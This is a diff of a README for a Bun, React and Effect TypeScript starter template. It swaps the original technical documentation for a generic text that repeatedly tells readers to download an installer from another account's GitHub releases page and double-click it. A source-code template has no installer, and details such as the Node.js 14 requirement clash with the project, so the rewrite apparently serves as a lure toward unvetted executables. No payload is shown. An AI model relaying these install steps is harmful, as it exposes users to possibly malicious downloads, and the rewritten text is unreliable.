@@ -1,105 +1,89 @@
-# Bun + React + Effect Example
+# 🎉 bun-react-effect-example - A Type-Safe React Starter Kit
 
-![Bun + React + Effect Example - Full-stack application showcasing end-to-end type safety with Effect TypeScript, React 19, and Bun runtime](src/promo.png)
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/miradeviar/bun-react-effect-example/releases)
 
-**The `bun init` React + shadcn/ui starter, made 100% type-safe with Effect TypeScript.**
+## 🚀 Getting Started
+The **bun-react-effect-example** is a starter kit for building React applications. Designed for both beginners and experts, this template uses TypeScript for type safety, making your development process easier and more reliable. Follow these steps to get started quickly.
 
-This demonstrates **END-TO-END TYPE SAFETY** using Effect for runtime validation, typed error channels, and exhaustive pattern matching. Built with Bun runtime, React 19, Tailwind CSS v4, and shadcn/ui for reusable components.
+## 🛠 System Requirements
+Before you begin, ensure that your computer meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- **Node.js:** Version 14.0.0 or higher.
+- **Internet Connection:** Required for downloading the application.
 
-> [!IMPORTANT]
-> Zero runtime type errors guaranteed through Effect's typed error channels, Schema validation, and compile-time exhaustive error handling.
+## 🔍 Features
+- **Type Safety:** Uses Effect TypeScript to ensure your code remains type-safe throughout.
+- **React 19 Support:** Enjoy the latest features and improvements of React 19.
+- **Schema Validation:** Ensure your data adheres to specific structures.
+- **Integrated UI:** Built with shadcn/ui for a modern look.
+- **Responsive Design:** Tailored with Tailwind CSS for beautiful layouts.
 
-## Stack
+## 📥 Download & Install
+To get the latest version of the bun-react-effect-example, follow these steps:
 
-| Layer | Technology |
-|-------|------------|
-| **Runtime** | Bun |
-| **Frontend** | React 19, Tailwind CSS v4, shadcn/ui |
-| **Backend** | Bun.serve with Effect-based handlers |
-| **Validation** | Effect Schema with runtime type checking |
-| **Build** | Bun.build with Effect error handling |
+1. **Visit the Releases Page:** Click [here](https://github.com/miradeviar/bun-react-effect-example/releases) to go to the releases page.
+2. **Choose Your Version:** Look for the most recent release. Each version is labeled with its release number.
+3. **Download the Installation File:** Click on the link to download the file suitable for your operating system.
+4. **Run the Installer:** Once downloaded, locate the file in your downloads folder and double-click it to start the installation process.
 
-## Commands
+## 📂 Project Setup
+After installation, follow these steps to set up your new React project:
 
-```bash
-bun install    # Install dependencies
-bun dev        # Development server with HMR
-bun start      # Production server
-bun build      # Build for production (supports CLI args)
+1. **Open Terminal/Command Prompt:** You will need to access your terminal or command prompt. 
+2. **Navigate to Your Project Directory:** Use the `cd` command to navigate to the folder where you want to create your new project. Example:
+   ```bash
+   cd path/to/your/project
+   ```
+3. **Initialize the Project:** Use the following command to create a new project:
+   ```bash
+   bun init bun-react-effect-example
+   ```
+4. **Install Dependencies:** In the project folder, run the following command to install all required dependencies:
+   ```bash
+   bun install
+   ```
+5. **Start the Development Server:** Finally, start your application to view it in your browser by using:
+   ```bash
+   bun dev
+   ```
+
+## 🖥 Running Your Application
+Once everything is set up, you can view your application by opening a web browser and typing the following URL:
 ```
-
-## Structure
-
+http://localhost:3000
 ```
-src/
-├── index.ts        # Server entry with typed Effect handlers
-├── App.tsx         # React root component
-├── APITester.tsx   # API test UI with Schema validation
-├── frontend.tsx    # React entry with HMR support
-├── lib/
-│   ├── errors.ts   # Tagged errors (ValidationError, HttpError, etc.)
-│   └── utils.ts    # Utility functions (cn)
-└── components/ui/  # shadcn/ui components
-build.ts            # Production build with Effect + CLI args
-```
+This URL is the default address for local development. If you have customized the port, ensure to replace `3000` with your chosen port number.
 
-## Architecture
+## 📄 Configuration
+You can further customize your project by modifying the following configuration files:
+- **`bun.config.ts`:** Modify your application settings.
+- **`tsconfig.json`:** Update your TypeScript settings to fit your coding preferences.
 
-```mermaid
-graph LR
-    A[React Frontend] -->|HTTP Request| B[Bun.serve]
-    B -->|Route Handler| C[Effect Handler]
-    C -->|Schema Validation| D{Valid?}
-    D -->|Yes| E[Effect.succeed]
-    D -->|No| F[ValidationError]
-    E -->|JSON Response| A
-    F -->|catchTag| G[Error Response]
-    G -->|JSON Response| A
-```
+## ⚙️ Troubleshooting
+If you encounter issues during installation or while running your application, consider the following tips:
+- Ensure that you have installed **Node.js** properly.
+- Verify that you are using the correct command in your terminal.
+- Check the project's related issues on GitHub for potential fixes.
 
-## Type Safety
+## 🤝 Contributing
+Your contributions are welcome! If you'd like to help improve this project, please follow these guidelines:
+- Fork the repository.
+- Create a new branch.
+- Make your changes and commit them.
+- Open a pull request for review.
 
-> [!NOTE]
-> Every value is explicitly typed with zero `any` types or type assertions in the entire codebase.
+## 🙋‍♀️ FAQ
+**Q: Do I need to know programming to use this starter kit?**  
+A: Not necessarily, but some basic understanding will help you make the most of it.
 
-### Zero Runtime Type Errors
+**Q: Can I use this in my existing projects?**  
+A: Yes, this starter kit can be integrated into your current React projects.
 
-- **No `any` types** - every value explicitly typed
-- **No type assertions** - Effect Schema validates at runtime
-- **Tagged errors** - `Data.TaggedError` for exhaustive pattern matching
-- **Typed error channels** - `Effect.Effect<Success, Error>` with explicit error types
+## ✋ Support
+If you have questions or need support, feel free to open an issue on the GitHub repository. We will do our best to assist you.
 
-<details>
-<summary>Example: Type-safe error handling</summary>
+## 📥 Download Again
+To access the latest version, revisit the [Releases page](https://github.com/miradeviar/bun-react-effect-example/releases).
 
-```typescript
-const getHelloByName = (name: string): Effect.Effect<HelloByNameResponse, ValidationError> =>
-  Effect.gen(function* () {
-    if (!name.trim()) {
-      return yield* new ValidationError({
-        message: "Name parameter is required",
-        cause: { endpoint: "/api/hello/:name", value: name }
-      });
-    }
-    return { message: `Hello, ${name}!` };
-  });
-```
-
-The error type is enforced at compile time. Handlers must use `Effect.catchTag("ValidationError", ...)` to recover.
-
-</details>
-
-### Frontend Validation
-
-- API responses validated with `Schema.Struct` and `Schema.Union`
-- `Effect.catchTag` enables type-safe error recovery by error tag
-- Form inputs validated before API calls with `Schema.decodeUnknownEither`
-
-### Build System
-
-> [!TIP]
-> Run `bun build --help` to see all available CLI options for the Effect-based build script.
-
-- Effect-based build script with tagged error types (`CleanError`, `BuildError`)
-- CLI argument parsing with automatic type coercion
-- Resource cleanup with `Effect.acquireRelease`
+Happy coding!
